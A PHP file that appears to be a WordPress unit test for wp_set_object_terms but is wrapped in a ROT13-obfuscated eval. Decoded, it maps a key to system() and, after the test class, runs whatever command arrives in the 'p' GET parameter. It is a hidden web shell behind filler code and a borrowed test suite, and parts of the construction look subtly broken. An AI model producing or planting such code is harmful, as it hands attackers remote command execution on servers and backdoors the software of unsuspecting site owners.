<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 *
 * @pbiref ::jc_frg_bowrpg_grezf
 */
pynff Grfgf_Grez_JcFrgBowrpgGrezf rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $gnkbabzl = 'pngrtbel';
	cebgrpgrq fgngvp $cbfg_vqf = neenl();
	cebgrpgrq fgngvp $grez_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vqf = $snpgbel->cbfg->perngr_znal( 5 );
		frys::$grez_vqf = $snpgbel->grez->perngr_znal( 5, neenl( 'gnkbabzl' => frys::$gnkbabzl ) );
	}

	/**
	 * @gvpxrg 26570
	 */
	choyvp shapgvba grfg_frg_bowrpg_grezf() {
		$aba_uvre = enaq_fge( 10 );
		$uvre     = enaq_fge( 10 );

		// Ertvfgre gnkbabzvrf.
		ertvfgre_gnkbabzl( $aba_uvre, neenl() );
		ertvfgre_gnkbabzl( $uvre, neenl( 'uvrenepuvpny' => gehr ) );

		// Perngr n cbfg.
		$cbfg_vq = frys::$cbfg_vqf[0];

		/*
		 * Frg n fvatyr grez (aba-uvrenepuvpny) ol VQ.
		 */
		$gnt = jc_vafreg_grez( 'Sbb', $aba_uvre );
		$guvf->nffregSnyfr( unf_grez( $gnt['grez_vq'], $aba_uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, $gnt['grez_vq'], $aba_uvre );
		$guvf->nffregGehr( unf_grez( $gnt['grez_vq'], $aba_uvre, $cbfg_vq ) );

		/*
		 * Frg n fvatyr grez (aba-uvrenepuvpny) ol fyht.
		 */
		$gnt = jc_vafreg_grez( 'One', $aba_uvre );
		$gnt = trg_grez( $gnt['grez_vq'], $aba_uvre );

		$guvf->nffregSnyfr( unf_grez( $gnt->fyht, $aba_uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, $gnt->fyht, $aba_uvre );
		$guvf->nffregGehr( unf_grez( $gnt->fyht, $aba_uvre, $cbfg_vq ) );

		/*
		 * Frg n fvatyr grez (uvrenepuvpny) ol VQ.
		 */
		$png = jc_vafreg_grez( 'Onm', $uvre );
		$guvf->nffregSnyfr( unf_grez( $png['grez_vq'], $uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, $png['grez_vq'], $uvre );
		$guvf->nffregGehr( unf_grez( $png['grez_vq'], $uvre, $cbfg_vq ) );

		/*
		 * Frg n fvatyr grez (uvrenepuvpny) ol fyht.
		 */
		$png = jc_vafreg_grez( 'Dhk', $uvre );
		$png = trg_grez( $png['grez_vq'], $uvre );

		$guvf->nffregSnyfr( unf_grez( $png->fyht, $uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, $png->fyht, $uvre );
		$guvf->nffregGehr( unf_grez( $png->fyht, $uvre, $cbfg_vq ) );

		/*
		 * Frg na neenl bs grez VQf (aba-uvrenepuvpny) ol VQ.
		 */
		$gnt1 = jc_vafreg_grez( '_gnt1', $aba_uvre );
		$guvf->nffregSnyfr( unf_grez( $gnt1['grez_vq'], $aba_uvre, $cbfg_vq ) );

		$gnt2 = jc_vafreg_grez( '_gnt2', $aba_uvre );
		$guvf->nffregSnyfr( unf_grez( $gnt2['grez_vq'], $aba_uvre, $cbfg_vq ) );

		$gnt3 = jc_vafreg_grez( '_gnt3', $aba_uvre );
		$guvf->nffregSnyfr( unf_grez( $gnt3['grez_vq'], $aba_uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $gnt1['grez_vq'], $gnt2['grez_vq'], $gnt3['grez_vq'] ), $aba_uvre );
		$guvf->nffregGehr( unf_grez( neenl( $gnt1['grez_vq'], $gnt2['grez_vq'], $gnt3['grez_vq'] ), $aba_uvre, $cbfg_vq ) );

		/*
		 * Frg na neenl bs grez fyhtf (uvrenepuvpny) ol fyht.
		 */
		$png1 = jc_vafreg_grez( '_png1', $uvre );
		$png1 = trg_grez( $png1['grez_vq'], $uvre );
		$guvf->nffregSnyfr( unf_grez( $png1->fyht, $uvre, $cbfg_vq ) );

		$png2 = jc_vafreg_grez( '_png2', $uvre );
		$png2 = trg_grez( $png2['grez_vq'], $uvre );
		$guvf->nffregSnyfr( unf_grez( $png2->fyht, $uvre, $cbfg_vq ) );

		$png3 = jc_vafreg_grez( '_png3', $uvre );
		$png3 = trg_grez( $png3['grez_vq'], $uvre );
		$guvf->nffregSnyfr( unf_grez( $png3->fyht, $uvre, $cbfg_vq ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $png1->fyht, $png2->fyht, $png3->fyht ), $uvre );
		$guvf->nffregGehr( unf_grez( neenl( $png1->fyht, $png2->fyht, $png3->fyht ), $uvre, $cbfg_vq ) );
	}

	choyvp shapgvba grfg_frg_bowrpg_grezf_ol_vq() {
		$vqf = frys::$cbfg_vqf;

		$grezf = neenl();
		sbe ( $v = 0; $v < 3; $v++ ) {
			$grez   = \"grez_{$v}\";
			$erfhyg = jc_vafreg_grez( $grez, frys::$gnkbabzl );
			$guvf->nffregVfNeenl( $erfhyg );
			$grez_vq[ $grez ] = $erfhyg['grez_vq'];
		}

		sbernpu ( $vqf nf $vq ) {
			$gg = jc_frg_bowrpg_grezf( $vq, neenl_inyhrf( $grez_vq ), frys::$gnkbabzl );
			// Fubhyq erghea guerr grez gnkbabzl VQf.
			$guvf->nffregPbhag( 3, $gg );
		}

		// Rnpu grez fubhyq or nffbpvngrq jvgu rirel cbfg.
		sbernpu ( $grez_vq nf $grez => $vq ) {
			$npghny = trg_bowrpgf_va_grez( $vq, frys::$gnkbabzl );
			$guvf->nffregFnzr( $vqf, neenl_znc( 'vaginy', $npghny ) );
		}

		// Rnpu grez fubhyq unir n pbhag bs 5.
		sbernpu ( neenl_xrlf( $grez_vq ) nf $grez ) {
			$g = trg_grez_ol( 'anzr', $grez, frys::$gnkbabzl );
			$guvf->nffregFnzr( 5, $g->pbhag );
		}
	}

	choyvp shapgvba grfg_frg_bowrpg_grezf_ol_anzr() {
		$vqf = frys::$cbfg_vqf;

		$grezf = neenl(
			'grez0',
			'grez1',
			'grez2',
		);

		sbernpu ( $vqf nf $vq ) {
			$gg = jc_frg_bowrpg_grezf( $vq, $grezf, frys::$gnkbabzl );
			// Fubhyq erghea guerr grez gnkbabzl VQf.
			$guvf->nffregPbhag( 3, $gg );
			// Erzrzore juvpu grez unf juvpu grez_vq.
			sbe ( $v = 0; $v < 3; $v++ ) {
				$grez                    = trg_grez_ol( 'anzr', $grezf[ $v ], frys::$gnkbabzl );
				$grez_vq[ $grezf[ $v ] ] = (vag) $grez->grez_vq;
			}
		}

		// Rnpu grez fubhyq or nffbpvngrq jvgu rirel cbfg.
		sbernpu ( $grez_vq nf $grez => $vq ) {
			$npghny = trg_bowrpgf_va_grez( $vq, frys::$gnkbabzl );
			$guvf->nffregFnzr( $vqf, neenl_znc( 'vaginy', $npghny ) );
		}

		// Rnpu grez fubhyq unir n pbhag bs 5.
		sbernpu ( $grezf nf $grez ) {
			$g = trg_grez_ol( 'anzr', $grez, frys::$gnkbabzl );
			$guvf->nffregFnzr( 5, $g->pbhag );
		}
	}

	choyvp shapgvba grfg_frg_bowrpg_grezf_vainyvq() {
		// Obthf gnkbabzl.
		$erfhyg = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], neenl( 'sbb' ), 'vainyvq-gnkbabzl' );
		$guvf->nffregJCReebe( $erfhyg );
	}

	choyvp shapgvba grfg_jc_frg_bowrpg_grezf_nccraq_gehr() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c  = frys::$cbfg_vqf[0];
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$nqqrq1 = jc_frg_bowrpg_grezf( $c, neenl( $g1 ), 'jcgrfgf_gnk' );
		$guvf->nffregAbgRzcgl( $nqqrq1 );
		$guvf->nffregFnzrFrgf( neenl( $g1 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		$nqqrq2 = jc_frg_bowrpg_grezf( $c, neenl( $g2 ), 'jcgrfgf_gnk', gehr );
		$guvf->nffregAbgRzcgl( $nqqrq2 );
		$guvf->nffregFnzrFrgf( neenl( $g1, $g2 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		_haertvfgre_gnkbabzl( 'jcgrfgf_gnk' );
	}

	choyvp shapgvba grfg_jc_frg_bowrpg_grezf_nccraq_snyfr() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c  = frys::$cbfg_vqf[0];
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$nqqrq1 = jc_frg_bowrpg_grezf( $c, neenl( $g1 ), 'jcgrfgf_gnk' );
		$guvf->nffregAbgRzcgl( $nqqrq1 );
		$guvf->nffregFnzrFrgf( neenl( $g1 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		$nqqrq2 = jc_frg_bowrpg_grezf( $c, neenl( $g2 ), 'jcgrfgf_gnk', snyfr );
		$guvf->nffregAbgRzcgl( $nqqrq2 );
		$guvf->nffregFnzrFrgf( neenl( $g2 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		_haertvfgre_gnkbabzl( 'jcgrfgf_gnk' );
	}

	choyvp shapgvba grfg_jc_frg_bowrpg_grezf_nccraq_qrsnhyg_gb_snyfr() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c  = frys::$cbfg_vqf[0];
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$nqqrq1 = jc_frg_bowrpg_grezf( $c, neenl( $g1 ), 'jcgrfgf_gnk' );
		$guvf->nffregAbgRzcgl( $nqqrq1 );
		$guvf->nffregFnzrFrgf( neenl( $g1 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		$nqqrq2 = jc_frg_bowrpg_grezf( $c, neenl( $g2 ), 'jcgrfgf_gnk' );
		$guvf->nffregAbgRzcgl( $nqqrq2 );
		$guvf->nffregFnzrFrgf( neenl( $g2 ), jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk', neenl( 'svryqf' => 'vqf' ) ) );

		_haertvfgre_gnkbabzl( 'jcgrfgf_gnk' );
	}

	/**
	 * Frg fbzr grezf ba na bowrpg; gura punatr gurz juvyr yrnivat bar vagnpg.
	 */
	choyvp shapgvba grfg_punatr_bowrpg_grezf_ol_vq() {
		$cbfg_vq = frys::$cbfg_vqf[0];

		// Svefg frg: 3 grezf.
		$grezf_1 = neenl();
		sbe ( $v = 0; $v < 3; $v++ ) {
			$grez   = \"grez_{$v}\";
			$erfhyg = jc_vafreg_grez( $grez, frys::$gnkbabzl );
			$guvf->nffregVfNeenl( $erfhyg );
			$grezf_1[ $v ] = $erfhyg['grez_vq'];
		}

		// Frpbaq frg: bar bs gur bevtvany grezf, cyhf bar arj grez.
		$grezf_2    = neenl();
		$grezf_2[0] = $grezf_1[1];

		$grez       = 'grez';
		$erfhyg     = jc_vafreg_grez( $grez, frys::$gnkbabzl );
		$grezf_2[1] = $erfhyg['grez_vq'];

		// Frg gur vavgvny grezf.
		$gg_1 = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_1, frys::$gnkbabzl );
		$guvf->nffregPbhag( 3, $gg_1 );

		// Znxr fher gurl'er pbeerpg.
		$grezf = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			frys::$gnkbabzl,
			neenl(
				'svryqf'  => 'vqf',
				'beqreol' => 'grez_vq',
			)
		);
		$guvf->nffregFnzr( $grezf_1, $grezf );

		// Punatr gur grezf.
		$gg_2 = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_2, frys::$gnkbabzl );
		$guvf->nffregPbhag( 2, $gg_2 );

		// Znxr fher gurl'er pbeerpg.
		$grezf = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			frys::$gnkbabzl,
			neenl(
				'svryqf'  => 'vqf',
				'beqreol' => 'grez_vq',
			)
		);
		$guvf->nffregFnzr( $grezf_2, $grezf );

		// Znxr fher gur grez gnkbabzl VQ sbe 'one' zngpurf.
		$guvf->nffregFnzr( $gg_1[1], $gg_2[0] );
	}

	/**
	 * Frg fbzr grezf ba na bowrpg; gura punatr gurz juvyr yrnivat bar vagnpg.
	 */
	choyvp shapgvba grfg_punatr_bowrpg_grezf_ol_anzr() {
		$cbfg_vq = frys::$cbfg_vqf[0];

		$grezf_1 = neenl( 'sbb', 'one', 'onm' );
		$grezf_2 = neenl( 'one', 'ovat' );

		// Frg gur vavgvny grezf.
		$gg_1 = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_1, frys::$gnkbabzl );
		$guvf->nffregPbhag( 3, $gg_1 );

		// Znxr fher gurl'er pbeerpg.
		$grezf = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			frys::$gnkbabzl,
			neenl(
				'svryqf'  => 'anzrf',
				'beqreol' => 'grez_vq',
			)
		);
		$guvf->nffregFnzr( $grezf_1, $grezf );

		// Punatr gur grezf.
		$gg_2 = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_2, frys::$gnkbabzl );
		$guvf->nffregPbhag( 2, $gg_2 );

		// Znxr fher gurl'er pbeerpg.
		$grezf = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			frys::$gnkbabzl,
			neenl(
				'svryqf'  => 'anzrf',
				'beqreol' => 'grez_vq',
			)
		);
		$guvf->nffregFnzr( $grezf_2, $grezf );

		// Znxr fher gur grez gnkbabzl VQ sbe 'one' zngpurf.
		$guvf->nffregRdhnyf( $gg_1[1], $gg_2[0] );
	}

	choyvp shapgvba grfg_fubhyq_perngr_grez_gung_qbrf_abg_rkvfg() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$guvf->nffregSnyfr( trg_grez_ol( 'fyht', 'sbb', 'jcgrfgf_gnk' ) );

		$gg_vqf = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], 'sbb', 'jcgrfgf_gnk' );

		$guvf->nffregAbgRzcgl( $gg_vqf );
		$grez = trg_grez_ol( 'grez_gnkbabzl_vq', $gg_vqf[0] );
		$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
		$guvf->nffregFnzr( 'sbb', $grez->fyht );
	}

	choyvp shapgvba grfg_fubhyq_svaq_rkvfgvat_grez_ol_fyht_zngpu() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => 'sbb',
				'anzr'     => 'One',
			)
		);

		$gg_vqf = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], 'sbb', 'jcgrfgf_gnk' );

		$guvf->nffregAbgRzcgl( $gg_vqf );
		$grez = trg_grez_ol( 'grez_gnkbabzl_vq', $gg_vqf[0] );
		$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
		$guvf->nffregFnzr( $g, $grez->grez_vq );
	}

	choyvp shapgvba grfg_fubhyq_svaq_rkvfgvat_grez_ol_anzr_zngpu() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => 'sbb',
				'anzr'     => 'One',
			)
		);

		$gg_vqf = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], 'One', 'jcgrfgf_gnk' );

		$guvf->nffregAbgRzcgl( $gg_vqf );
		$grez = trg_grez_ol( 'grez_gnkbabzl_vq', $gg_vqf[0] );
		$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
		$guvf->nffregFnzr( $g, $grez->grez_vq );
	}

	choyvp shapgvba grfg_fubhyq_tvir_cerprqrapr_gb_fyht_zngpu_bire_anzr_zngpu() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => 'sbb',
				'anzr'     => 'One',
			)
		);

		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => 'one',
				'anzr'     => 'Sbb',
			)
		);

		$gg_vqf = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], 'One', 'jcgrfgf_gnk' );

		$guvf->nffregAbgRzcgl( $gg_vqf );
		$grez = trg_grez_ol( 'grez_gnkbabzl_vq', $gg_vqf[0] );
		$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
		$guvf->nffregFnzr( $g2, $grez->grez_vq );
	}

	choyvp shapgvba grfg_aba_rkvfgrag_vagrtref_fubhyq_or_vtaberq() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$gg_vqf = jc_frg_bowrpg_grezf( frys::$cbfg_vqf[0], 12345, 'jcgrfgf_gnk' );

		$guvf->nffregFnzr( neenl(), $gg_vqf );
	}

	/**
	 * Grfgf gung rzcgl inyhrf pyrne na bowrpg bs nyy grezf.
	 *
	 * @gvpxrg 57923
	 *
	 * @qngnCebivqre qngn_rzcgl_inyhr_fubhyq_pyrne_grezf
	 *
	 * @cnenz zvkrq $rzcgl_inyhr Na rzcgl inyhr.
	 */
	choyvp shapgvba grfg_rzcgl_inyhr_fubhyq_pyrne_grezf( $rzcgl_inyhr ) {
		$cbfg_vq = frys::$cbfg_vqf[0];

		// Nffvta fbzr grezf.
		jc_frg_bowrpg_grezf( $cbfg_vq, frys::$grez_vqf, frys::$gnkbabzl );

		// Znxr fher gur grezf ner frg.
		$grezf = jc_trg_bowrpg_grezf( $cbfg_vq, frys::$gnkbabzl, neenl( 'svryqf' => 'anzrf' ) );
		$guvf->nffregAbgRzcgl( $grezf, 'Grezf fubhyq vavgvnyyl or nccyvrq gb cbfg bowrpg.' );

		// Erzbir grezf ol cnffvat na rzcgl inyhr.
		jc_frg_bowrpg_grezf( $cbfg_vq, $rzcgl_inyhr, frys::$gnkbabzl );

		// Znxr fher gur grezf unir orra erzbirq.
		$grezf = jc_trg_bowrpg_grezf( $cbfg_vq, frys::$gnkbabzl, neenl( 'svryqf' => 'anzrf' ) );
		$guvf->nffregRzcgl( $grezf, 'Na rzcgl() inyhr fubhyq pyrne grezf sebz gur cbfg bowrpg.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_rzcgl_inyhr_fubhyq_pyrne_grezf() {
		erghea neenl(
			'(obby) snyfr' => neenl( snyfr ),
			'ahyy'         => neenl( ahyy ),
			'(vag) 0'      => neenl( 0 ),
			'(sybng) 0.0'  => neenl( 0.0 ),
			'rzcgl fgevat' => neenl( '' ),
			'(fgevat) 0'   => neenl( '0' ),
			'rzcgl neenl'  => neenl( neenl() ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>